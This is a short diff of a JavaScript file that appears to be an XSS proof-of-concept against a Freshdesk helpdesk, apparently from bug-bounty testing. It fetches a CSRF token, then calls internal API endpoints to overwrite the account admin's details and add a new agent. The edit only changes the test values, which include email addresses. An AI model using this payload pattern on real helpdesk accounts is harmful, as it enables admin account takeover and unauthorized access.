@@ -10,8 +10,8 @@ async function getCsrfToken() {
 async function updateAccountAdmin(csrfToken) {
     const url = 'https://usnavneel.freshdesk.com/api/_/account_admin';
     const data = {
-        first_name: "XSS",
-        last_name: "attack",
+        first_name: "XSS1",
+        last_name: "attttack",
         email: "danockrishu13@gmail.com",
         phone: 1111111111,
         company_name: "Navneel xss company"
@@ -34,8 +34,8 @@ async function updateAccountAdmin(csrfToken) {
 async function addAgent(csrfToken) {
     const url = 'https://usnavneel.freshdesk.com/api/_/agents';
     const data = {
-        name: "Navneel XSS",
-        email: "rishu_xss@yahoo.com",
+        name: "Navneel xSSSSSSSS",
+        email: "rishu_xss1@yahoo.com",
         phone: "",
         mobile: "",
         time_zone: "Eastern Time (US & Canada)",
